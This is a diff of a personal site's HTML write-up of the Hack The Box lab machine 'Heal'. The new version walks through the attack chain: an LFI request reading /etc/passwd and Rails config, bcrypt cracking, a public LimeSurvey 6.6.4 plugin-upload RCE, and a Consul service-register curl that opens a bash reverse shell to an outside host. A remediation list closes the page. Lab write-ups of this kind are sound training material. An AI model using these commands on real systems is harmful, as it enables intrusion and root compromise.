@@ -1,151 +1,359 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="description" content="HTB Heal parsed writeup with full section flow, commands, notes, and screenshot evidence." />
-  <title>HTB Heal Writeup | Will DeDominico</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="../assets/css/style.css" />
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Resume download endpoint on a Ruby-on-Rails API is a raw LFI. Leak Rails config + sqlite dev DB → crack LimeSurvey admin bcrypt → plugin-upload RCE as &#x60;www-data&#x60; → unauthenticated HashiCorp Consul service-registration → root.">
+<title>HTB Heal · Will DeDominico</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700;800&family=Source+Serif+4:opsz,wght@8..60,400;8..60,500;8..60,600;8..60,700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/style.css">
+<script>(function(){try{var s=localStorage.getItem('theme');var l=window.matchMedia&&window.matchMedia('(prefers-color-scheme: light)').matches;document.documentElement.setAttribute('data-theme', s||(l?'light':'dark'));}catch(e){document.documentElement.setAttribute('data-theme','dark');}})();</script>
 </head>
-<body>
-  <div class="background-noise" aria-hidden="true"></div>
-  <header class="site-header">
-    <div class="logo-lockup">
-      <div class="logo-mark" aria-hidden="true">💾</div>
-      <a href="../index.html#home" class="logo-type">Will<span>DeDominico</span></a>
-    </div>
-    <button class="nav-toggle" aria-expanded="false" aria-controls="site-nav">
-      <span class="sr-only">Toggle navigation</span>
-      <span></span>
-      <span></span>
+<body class="wp-body">
+<div class="grain" aria-hidden="true"></div>
+<header class="nav">
+  <div class="nav-left">
+    <a href="../index.html" class="nav-logo"><span class="nav-mark">W</span><span class="nav-name">Will</span><span class="nav-surname">DeDominico</span></a>
+    <button class="theme-toggle" type="button" aria-label="Toggle theme" title="Toggle theme">
+      <span class="theme-sun" aria-hidden="true">☀</span>
+      <span class="theme-moon" aria-hidden="true">☾</span>
     </button>
-    <nav id="site-nav" class="site-nav" aria-expanded="false">
-      <a href="../index.html#home">Home</a>
-      <a href="../index.html#experience">Experience</a>
-      <a href="../index.html#projects">Projects</a>
-      <a href="../index.html#writeups" class="is-active">Writeups</a>
-      <a href="../index.html#github">GitHub</a>
-      <a href="../index.html#ctf">CTFs</a>
-      <a href="../index.html#htb">HTB</a>
-      <a href="../index.html#clubs">Clubs</a>
-      <a href="../index.html#education">Education</a>
-    </nav>
-  </header>
+  </div>
+  <button class="nav-toggle" aria-expanded="false" aria-controls="nav-links"><span class="sr-only">Menu</span><span></span><span></span><span></span></button>
+  <nav id="nav-links" class="nav-links">
+    <a href="../index.html" class="">HOME</a>
+    <a href="../writeups/index.html" class="is-active">WRITEUPS</a>
+    <a href="../projects/index.html" class="">PROJECTS</a>
+    <a href="https://github.com/Moriz82" class="ext" target="_blank" rel="noopener">GITHUB <span class="ext-arrow">↗</span></a>
+    <a href="https://github.com/Moriz82/Resume/blob/main/Resume.pdf" class="ext" target="_blank" rel="noopener">RESUME <span class="ext-arrow">↗</span></a>
+    <a href="../about.html" class="">ABOUT</a>
+    <a href="../contact.html" class="">CONTACT</a>
+  </nav>
+</header>
 
-  <main>
-    <article class="section blog-layout post-content" aria-labelledby="post-title">
-      <header>
-        <h1 id="post-title">HTB Heal Writeup</h1>
-        <div class="post-meta">
-          <time datetime="2025-06-08">June 8, 2025</time>
-          <span>10 minute read</span>
-          <div class="post-tags" aria-label="Topics">
-            <span class="post-tag">HTB</span>
-            <span class="post-tag">Medium</span>
-            <span class="post-tag">Linux</span>
-            <span class="post-tag">LFI</span>
-            <span class="post-tag">Ruby on Rails</span>
-            <span class="post-tag">RCE</span>
+<div class="wp-stripe wp-stripe-top">
+  <div class="wp-stripe-inner">
+    <span class="wp-crumb"><span class="l">OPS.LOG</span> / <span>HTB</span> / <span class="cur">HTB-HEAL</span></span>
+    <span class="wp-crumb-r">ENG#01 &middot; CLASSIFIED-WHITE &middot; DECLASSIFIED 25.05.13</span>
+  </div>
+</div>
+
+<main class="wp-main">
+
+  <section class="wp-hero">
+    <div class="wp-hero-left card static">
+      <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+      <div class="wp-hero-row">
+        <div class="wp-hero-logo cat-">
+          
+          
+          
+          <span class="wp-hero-mono">OPS</span>
+        </div>
+        <div class="wp-hero-text">
+          <div class="wp-chips">
+            <span class="wp-chip diff-medium">MEDIUM</span>
+            <span class="wp-chip wp-chip-os os-linux">LINUX</span>
+            <span class="wp-chip wp-chip-ghost tag-cycle-0">LFI</span><span class="wp-chip wp-chip-ghost tag-cycle-1">API</span><span class="wp-chip wp-chip-ghost tag-cycle-2">RCE</span>
+            <span class="wp-chip wp-chip-pts">45 PTS</span>
           </div>
+          <h1 class="wp-title">HTB Heal<span class="wp-title-mark">&mdash;</span></h1>
+          <p class="wp-summary">Resume download endpoint on a Ruby-on-Rails API is a raw LFI. Leak Rails config + sqlite dev DB → crack LimeSurvey admin bcrypt → plugin-upload RCE as `www-data` → unauthenticated HashiCorp Consul service-registration → root.</p>
         </div>
-      </header>
+      </div>
+    </div>
 
-      <figure class="post-hero">
-        <img src="../assets/img/writeups/htb-heal.png" alt="First page preview of the HTB Heal writeup PDF report" />
-        <figcaption>Parsed from your HTB Heal PDF report. Target profile: Medium Linux web/API chain.</figcaption>
-      </figure>
+    <aside class="wp-meta-card card static">
+      <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+      <div class="card-head"><span class="l"># ENGAGEMENT META</span></div>
+      <hr class="dashed">
+      <dl class="wp-meta-list">
+        <div><dt>PLATFORM</dt><dd>Hack The Box</dd></div>
+        <div><dt>TARGET</dt><dd>heal.htb</dd></div>
+        <div><dt>REF</dt><dd>10.10.11.46</dd></div>
+        <div><dt>START</dt><dd>15:26 CDT</dd></div>
+        
+        <div><dt>DURATION</dt><dd>10 min read</dd></div>
+        <div><dt>OPERATOR</dt><dd>WDD-01</dd></div>
+      </dl>
+    </aside>
+  </section>
 
-      <div class="post-body">
-        <p><strong>Description (parsed):</strong> Heal focuses on web exploitation through LFI and admin-panel abuse, with follow-on privilege escalation via local service discovery.</p>
+  <section class="wp-killchain card static">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <div class="wp-killchain-head">
+      <span class="l"># KILL CHAIN &middot; 5 STAGES</span>
+      <span class="r">OUTCOME: <span class="hl-ok">ROOT</span></span>
+    </div>
+    <hr class="dashed">
+    <div class="wp-killchain-grid">
+      <a class="wp-kc-card kc-warn" href="#recon">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.01</div>
+        <div class="kc-stage">RECON</div>
+        <div class="kc-sub">nginx + rails api</div>
+        <div class="kc-tag kc-tag-warn">HTTP</div>
+      </a>
+      <a class="wp-kc-card kc-warn" href="#lfi">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.02</div>
+        <div class="kc-stage">LFI</div>
+        <div class="kc-sub">download?filename&#x3D;</div>
+        <div class="kc-tag kc-tag-warn">API</div>
+      </a>
+      <a class="wp-kc-card kc-warn" href="#creds">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.03</div>
+        <div class="kc-stage">CREDS</div>
+        <div class="kc-sub">sqlite3 dev db</div>
+        <div class="kc-tag kc-tag-warn">HASHCAT</div>
+      </a>
+      <a class="wp-kc-card kc-warn" href="#rce">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.04</div>
+        <div class="kc-stage">RCE</div>
+        <div class="kc-sub">limesurvey plugin</div>
+        <div class="kc-tag kc-tag-warn">RCE</div>
+      </a>
+      <a class="wp-kc-card kc-ok" href="#root">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.05</div>
+        <div class="kc-stage">ROOT</div>
+        <div class="kc-sub">consul service reg</div>
+        <div class="kc-tag kc-tag-ok">GOAL</div>
+      </a>
+    </div>
+  </section>
 
-        <div class="content-card">
-          <h3>Skills Required</h3>
-          <ul>
-            <li>Linux basics</li>
-            <li>Port scanning / enumeration</li>
-            <li>Burp Suite basics</li>
-            <li>sqlite3 basics</li>
-            <li>Password cracking basics</li>
-          </ul>
+  <div class="wp-grid">
+
+    <aside class="wp-toc">
+      <div class="wp-toc-head"># STAGES</div>
+      <nav>
+        <a href="#recon" class="wp-toc-row" data-stage="01">
+          <span class="n">01</span>
+          <span class="t">RECON</span>
+        </a>
+        <a href="#lfi" class="wp-toc-row" data-stage="02">
+          <span class="n">02</span>
+          <span class="t">LFI</span>
+        </a>
+        <a href="#creds" class="wp-toc-row" data-stage="03">
+          <span class="n">03</span>
+          <span class="t">CREDS</span>
+        </a>
+        <a href="#rce" class="wp-toc-row" data-stage="04">
+          <span class="n">04</span>
+          <span class="t">RCE</span>
+        </a>
+        <a href="#root" class="wp-toc-row" data-stage="05">
+          <span class="n">05</span>
+          <span class="t">ROOT</span>
+        </a>
+      </nav>
+    </aside>
+
+    <article class="wp-article">
+      <section class="wp-stage" id="recon" data-stage="01">
+<div class="wp-stage-lbl"># STG.01 &middot; RECON</div>
+<h2 class="wp-stage-title">nginx up front, Ruby-on-Rails API in the back.</h2>
+<div class="wp-stage-body"><div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ nmap -sV -sC -A -T5 -p- 10.10.11.46 --min-rate 2000
+22/tcp open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
+80/tcp open  http     nginx 1.18.0 (Ubuntu)
+|_http-title: Heal
+
+<p>$ nmap -T5 -A api.heal.htb
+80/tcp open  http     nginx 1.18.0
+|_http-title: Ruby on Rails 7.1.4</code></pre></p>
+</div>
+`heal.htb` is the public site, `api.heal.htb` is the Rails backend. Register an account, build a resume, hit **Export as PDF** — the browser downloads `api.heal.htb/download?filename=<uuid>.pdf` behind the scenes.
+
+<figure class="wp-img"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><img src="../assets/img/writeups/htb-heal/01-nmap.png" alt="Only SSH + HTTP on the main host; api.heal.htb is a separate vhost running Rails" loading="lazy"><figcaption>Only SSH + HTTP on the main host; api.heal.htb is a separate vhost running Rails</figcaption></figure></div>
+</section>
+<section class="wp-stage" id="lfi" data-stage="02">
+<div class="wp-stage-lbl"># STG.02 &middot; LFI</div>
+<h2 class="wp-stage-title">`filename` param is unsanitized. Classic `../../../etc/passwd`.</h2>
+<div class="wp-stage-body"><figure class="wp-img"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><img src="../assets/img/writeups/htb-heal/02-burp-lfi.png" alt="Burp intercept: swapping the UUID for ../../../etc/passwd" loading="lazy"><figcaption>Burp intercept: swapping the UUID for ../../../etc/passwd</figcaption></figure>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># burp · GET /download</span></div>
+<pre class="wp-term-body"><code class="language-http">GET /download?filename=../../../etc/passwd HTTP/1.1
+Host: api.heal.htb
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+<p>HTTP/1.1 200 OK
+root:x:0:0:root:/root:/bin/bash
+...
+ralph:x:1000:1000:,,,:/home/ralph:/bin/bash</code></pre></p>
+</div>
+Rails config sits at `config/database.yml` — dev uses sqlite.
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># burp · GET /download</span></div>
+<pre class="wp-term-body"><code class="language-bash">GET /download?filename=../../config/database.yml
+→ development: adapter: sqlite3 database: storage/development.sqlite3
+
+<p>GET /download?filename=../../storage/development.sqlite3
+→ sqlite binary, 20 KB</code></pre></p>
+</div></div>
+</section>
+<section class="wp-stage" id="creds" data-stage="03">
+<div class="wp-stage-lbl"># STG.03 &middot; CREDS</div>
+<h2 class="wp-stage-title">Bcrypt ralph → `[REDACTED]`.</h2>
+<div class="wp-stage-body"><p>Open the dumped DB in SQLiteStudio. One row in the <code>users</code> table — <span class="hl-red">&lt;a href=&quot;mailto:ralph@heal.htb&quot;&gt;ralph@heal.htb&lt;/a&gt;</span> / <code>$2a$12$...</code> bcrypt / <code>is_admin = 1</code>.</p>
+<figure class="wp-img"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><img src="../assets/img/writeups/htb-heal/03-sqlite-dump.png" alt="ralph@heal.htb — bcrypt hash + is_admin = 1 in the dev sqlite" loading="lazy"><figcaption>ralph@heal.htb — bcrypt hash + is_admin = 1 in the dev sqlite</figcaption></figure>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@hashcat</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ hashcat -m 3200 -a 0 hash.txt rockyou.txt
+$2a$12$[BCRYPT-HASH] : [REDACTED]</code></pre>
+</div>
+SSH as ralph is blocked. Admin panel is on a second vhost — `take-survey.heal.htb/index.php/admin/authentication/sa/login`. Login lands on a <span class="hl-cool">LimeSurvey 6.6.4</span> admin.</div>
+</section>
+<section class="wp-stage" id="rce" data-stage="04">
+<div class="wp-stage-lbl"># STG.04 &middot; RCE</div>
+<h2 class="wp-stage-title">LimeSurvey 6.6.4 plugin-upload → www-data shell.</h2>
+<div class="wp-stage-body"><p>Public exploit from <code>N4s1rl1/Limesurvey-6.6.4-RCE</code> ships the full chain: CSRF token → login → upload malicious plugin zip → activate → trigger.</p>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ python3 exploit.py http://take-survey.heal.htb ralph [REDACTED] 80
+[INFO]    Retrieving CSRF token for login ...
+[SUCCESS] CSRF Token Retrieved
+[INFO]    Sending Login Request ...
+[SUCCESS] Login Successful
+[INFO]    Uploading Plugin ...
+[SUCCESS] Plugin Uploaded Successfully!
+[INFO]    Installing Plugin ...
+[SUCCESS] Plugin Installed Successfully!
+[INFO]    Activating Plugin ...
+[SUCCESS] Plugin Activated Successfully!
+[INFO]    Triggering Reverse Shell ...</code></pre>
+</div>
+<figure class="wp-img"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><img src="../assets/img/writeups/htb-heal/04-limesurvey-rce.png" alt="LimeSurvey 6.6.4 plugin-upload chain firing" loading="lazy"><figcaption>LimeSurvey 6.6.4 plugin-upload chain firing</figcaption></figure>
+Listener catches the callback:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · www-data@heal</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.83] from (UNKNOWN) [10.10.11.46] 55258
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+</div></div>
+</section>
+<section class="wp-stage" id="root" data-stage="05">
+<div class="wp-stage-lbl"># STG.05 &middot; ROOT</div>
+<h2 class="wp-stage-title">Consul is bound to localhost. `service/register` runs as root.</h2>
+<div class="wp-stage-body"><p>Rifling through <code>/var/www/limesurvey/application/config/config.php</code> leaks PostgreSQL creds — but Postgres permissions aren&#39;t enough for user pivot. <code>ss -tuln</code> is the real find:</p>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · www-data@heal</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ ss -tuln
+LISTEN  127.0.0.1:8500  (HashiCorp Consul HTTP API)
+LISTEN  127.0.0.1:8301
+LISTEN  127.0.0.1:8302
+LISTEN  127.0.0.1:8600</code></pre>
+</div>
+<span class="hl-cool">8500</span> is Consul. With no ACL tokens, anyone can `PUT /v1/agent/service/register` with a `Check` block that runs an arbitrary command — <span class="hl-red">as root</span>.
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · www-data@heal</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ curl -X PUT http://127.0.0.1:8500/v1/agent/service/register -d &#39;{
+  &quot;Name&quot;: &quot;pwned&quot;,
+  &quot;ID&quot;:   &quot;pwned&quot;,
+  &quot;Port&quot;: 9999,
+  &quot;Check&quot;: {
+    &quot;Args&quot;: [&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.83/6969 0&gt;&amp;1&quot;],
+    &quot;Interval&quot;: &quot;10s&quot;
+  }
+}&#39;</code></pre>
+</div>
+Second listener:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · root@heal</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ nc -lvnp 6969
+connect to [10.10.16.83] from heal.htb [10.10.11.46] 53994
+root@heal:/# cat /root/root.txt
+root@heal:/# cat /home/ron/user.txt</code></pre>
+</div>
+<figure class="wp-img"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><img src="../assets/img/writeups/htb-heal/05-consul-root.png" alt="Consul service/register runs the Check command as root — shell on the second listener" loading="lazy"><figcaption>Consul service/register runs the Check command as root — shell on the second listener</figcaption></figure>
+<aside class="wp-callout wp-note"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><div class="wp-callout-head"># WHY IT WORKED</div><div class="wp-callout-body"><p>Consul&#39;s <code>Check</code> block is designed to execute commands for health probes — the service will run them on the schedule you specify. When the HTTP API is unauthenticated on a host where Consul runs as root, every unauthenticated caller gets arbitrary code execution as root.</p>
+</div></aside></div>
+</section>
+      <nav class="wp-post-nav">
+<span></span>
+        <span class="wp-np-sig">LAST SIGNAL &middot; 25.05.13</span>
+        <a class="wp-np next" href="htb-planning-writeup.html">
+          <span class="l">ENG#02 &rarr;</span>
+          <span class="t">HTB PLANNING</span>
+        </a>
+        
+      </nav>
+    </article>
+
+    <aside class="wp-side">
+      <div class="wp-side-card">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="wp-side-head"># LOADOUT</div>
+        <hr class="dashed">
+        <div class="wp-loadout">
+          <div class="wp-loadout-row"><span class="tool">nmap</span><span class="purp">recon</span></div>
+          <div class="wp-loadout-row"><span class="tool">burp</span><span class="purp">proxy</span></div>
+          <div class="wp-loadout-row"><span class="tool">sqlitestudio</span><span class="purp">db</span></div>
+          <div class="wp-loadout-row"><span class="tool">hashcat</span><span class="purp">crack</span></div>
+          <div class="wp-loadout-row"><span class="tool">limesurvey-rce</span><span class="purp">exploit</span></div>
+          <div class="wp-loadout-row"><span class="tool">consul-api</span><span class="purp">root</span></div>
         </div>
-
-        <h2>Enumeration</h2>
-        <figure class="writeup-shot">
-          <img src="../assets/img/writeups/htb-heal/page-02.png" alt="Heal report screenshot showing initial host and service enumeration" />
-          <figcaption>Heal · Initial host discovery and API-facing reconnaissance.</figcaption>
-        </figure>
-        <p>The parsed report identifies SSH and HTTP first, then tracks an API host dependency required for full application functionality.</p>
-
-        <pre><code class="language-bash"># host mapping from report context
-echo "10.10.x.x heal.htb api.heal.htb" | sudo tee -a /etc/hosts
-
-# baseline enumeration (commands summarized from report workflow)
-nmap -sC -sV -Pn 10.10.x.x</code></pre>
-
-        <h3>Web Enumeration and LFI</h3>
-        <figure class="writeup-shot">
-          <img src="../assets/img/writeups/htb-heal/page-04.png" alt="Heal report screenshot showing modified file download request and LFI result" />
-          <figcaption>Heal · LFI validation through controlled download request manipulation.</figcaption>
-        </figure>
-        <p>The resume download workflow is intercepted and modified in Burp to read arbitrary files. The report uses <code>/etc/passwd</code> validation to confirm LFI.</p>
-
-        <pre><code class="language-http">GET /download?filename=../../../../../../etc/passwd HTTP/1.1
-Host: heal.htb</code></pre>
-
-        <div class="callout callout--info" data-label="Operator Note">
-          <p>The writeup correctly verifies LFI impact by reading universally available system files before targeting sensitive app config files.</p>
-        </div>
-
-        <h2>Foothold</h2>
-        <figure class="writeup-shot">
-          <img src="../assets/img/writeups/htb-heal/page-06.png" alt="Heal report screenshot showing database extraction and credential crack path" />
-          <figcaption>Heal · Database extraction and admin credential recovery workflow.</figcaption>
-        </figure>
-        <p>With LFI confirmed, the report pulls Rails <code>database.yml</code>, then retrieves sqlite data from storage. User hash material for <code>ralph</code> is extracted and cracked, enabling admin-panel access.</p>
-
-        <pre><code class="language-bash">hashcat -m 3200 [ralph_hash].txt rockyou.txt</code></pre>
-
-        <p>From the admin panel, LimeSurvey versioning leads to public plugin-RCE exploitation, yielding shell as <code>www-data</code>.</p>
-
-        <figure class="writeup-shot">
-          <img src="../assets/img/writeups/htb-heal/page-08.png" alt="Heal report screenshot showing plugin-based RCE execution path" />
-          <figcaption>Heal · Plugin-driven RCE to web shell context.</figcaption>
-        </figure>
-
-        <pre><code class="language-bash"># report reference exploit
-https://github.com/N4s1rl1/Limesurvey-6.6.4-RCE</code></pre>
-
-        <h2>Privilege Escalation</h2>
-        <figure class="writeup-shot">
-          <img src="../assets/img/writeups/htb-heal/page-09.png" alt="Heal report screenshot showing local service and privilege escalation investigation" />
-          <figcaption>Heal · Local service mapping and privilege escalation lead-in.</figcaption>
-        </figure>
-        <p>Post-RCE enumeration finds local-only services. The report maps port behavior and targets Consul (8500) for root-level code execution using crafted API requests from the compromised context.</p>
-
-        <pre><code class="language-bash">ss -tulnp
-# identify local service behavior around port 8500 and exploit accordingly</code></pre>
-
-        <div class="callout callout--warning" data-label="Notes">
-          <p>The original flow includes exploratory branches (e.g., PostgreSQL creds from config but no direct DB access as www-data), which documents dead ends and strengthens reproducibility.</p>
-        </div>
-
       </div>
 
-      <footer class="post-footer">
-        <p>Full technical report source:</p>
-        <a class="button primary" href="https://github.com/Moriz82/WriteUps-and-Reports/blob/main/HTB/HTB%20Heal%20Write%20Up.pdf" target="_blank" rel="noopener">Open Original PDF</a>
-        <a class="button ghost" href="../index.html#writeups">Back to Writeups</a>
-      </footer>
-    </article>
-  </main>
+      <div class="wp-side-card">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="wp-side-head"># REMEDIATION</div>
+        <hr class="dashed">
+        <ul class="wp-remediation">
+          <li>Strict &#x60;filename&#x60; allow-list on download endpoints (absolute paths, no &#x60;..&#x60;)</li>
+          <li>Never ship the sqlite dev DB to production; never hash secrets with bcrypt cost 4</li>
+          <li>Patch LimeSurvey past 6.6.4 (CVE-2024-56404 plugin upload RCE)</li>
+          <li>Bind Consul agent to &#x60;127.0.0.1&#x60; only, and require ACL tokens on the HTTP API</li>
+        </ul>
+      </div>
+    </aside>
 
-  <footer class="site-footer">
-    <p>© <span id="copyright-year"></span> Will DeDominico · Field-tested from San Antonio, TX.</p>
-  </footer>
+  </div>
 
-  <script src="../assets/js/main.js"></script>
+</main>
+
+<footer class="stats-strip">
+  <a class="stat-card" href="https://app.hackthebox.com/users/666550" target="_blank" rel="noopener">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <span class="stat-label">HTB</span>
+    <span class="stat-value">72 OWNED</span>
+  </a>
+  <a class="stat-card" href="../about.html#ctfs">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <span class="stat-label">CTFs</span>
+    <span class="stat-value">5 PLAYED</span>
+  </a>
+  <a class="stat-card" href="https://github.com/Moriz82" target="_blank" rel="noopener">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <span class="stat-label">GITHUB</span>
+    <span class="stat-value">@moriz82</span>
+  </a>
+</footer>
+<div class="colophon">
+  <span>// 2026 Will DeDominico · built on markdown</span>
+  <span>2026-04-22 18:33 UTC</span>
+</div>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/highlight.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/bash.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/powershell.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/python.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/yaml.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/json.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/swift.min.js" defer></script>
+<script>window.addEventListener('load',function(){if(window.hljs){hljs.configure({ignoreUnescapedHTML:true});document.querySelectorAll('pre code, .wp-term-body code').forEach(function(b){hljs.highlightElement(b);});}});</script>
+<script src="../assets/js/main.js"></script>
 </body>
 </html>
